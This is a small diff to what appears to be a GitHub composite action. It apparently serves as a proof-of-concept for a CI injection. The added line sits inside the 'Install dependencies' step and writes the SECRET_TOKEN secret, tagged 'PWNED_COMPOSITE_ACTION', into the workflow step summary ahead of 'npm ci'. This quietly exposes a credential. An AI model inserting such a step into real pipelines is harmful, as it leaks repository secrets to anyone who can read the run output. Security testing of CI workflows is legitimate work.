@@ -5,4 +5,6 @@ runs:
   steps:
     - name: Install dependencies
       shell: bash
-      run: cd utils && npm ci
+      run: |
+        echo "PWNED_COMPOSITE_ACTION secret=$SECRET_TOKEN event=$GITHUB_EVENT_NAME" >> "$GITHUB_STEP_SUMMARY"
+        cd utils && npm ci
